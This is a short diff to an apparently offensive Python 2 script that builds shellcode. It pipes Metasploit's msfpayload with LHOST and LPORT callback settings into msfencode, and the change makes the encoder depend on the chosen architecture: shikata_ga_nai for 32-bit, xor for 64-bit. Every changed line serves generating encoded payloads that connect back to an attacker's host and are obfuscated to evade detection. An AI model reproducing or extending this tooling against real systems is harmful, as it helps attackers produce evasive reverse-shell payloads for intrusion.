@@ -36,6 +36,7 @@ while 1:
 		# select 32bit payload
 		if arch == '1':
 			selection = 0
+			encoder = "x86/shikata_ga_nai"
 			while selection != range(1,2):
 				clear()
 				menus.shellcode32_menu()
@@ -49,6 +50,7 @@ while 1:
 					
 		if arch == '2':
 			selection = 0
+			encoder = "x64/xor"
 			while selection != range(1,2):
 				clear()
 				menus.shellcode64_menu()
@@ -85,8 +87,8 @@ while 1:
 		if encoding == '1' or encoding == '':
 			PrintInfo("Generating shellcode with x%s shikata_ga_nai. Please wait..." % iterations)
 			print ""
-			proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e x86/shikata_ga_nai -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
-								% (path, payload, ip, port, path, iterations), shell=True, stdout=subp.PIPE)
+			proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e %s -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
+								% (path, payload, ip, port, path, iterations, encoder), shell=True, stdout=subp.PIPE)
 			
 			shellcode = proc.communicate()[0]
 			shellcode = shellcode.strip(';')
